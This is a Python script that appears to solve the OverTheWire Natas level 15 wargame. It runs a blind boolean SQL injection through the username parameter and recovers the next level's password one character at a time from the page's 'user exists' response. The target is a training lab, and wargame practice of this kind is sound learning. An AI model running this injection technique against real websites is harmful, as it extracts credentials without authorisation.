#!/usr/bin/env python3
import requests


url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16'
auth = ('natas15', natas15_pass)

def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        sqli = f'" and password like binary "%{char}%'
        r = requests.get(url+sqli, auth=auth)
        if 'This user exists.' in r.text:
            charset += char
    return charset

def get_password(charset):
    password = ''
    while True:
        for char in charset:
            sqli = f'" and password like binary "{password+char}%'
            r = requests.get(url+sqli, auth=auth)
            if 'This user exists.' in r.text:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    charset = get_charset()
    password = get_password(charset)
    print(password)
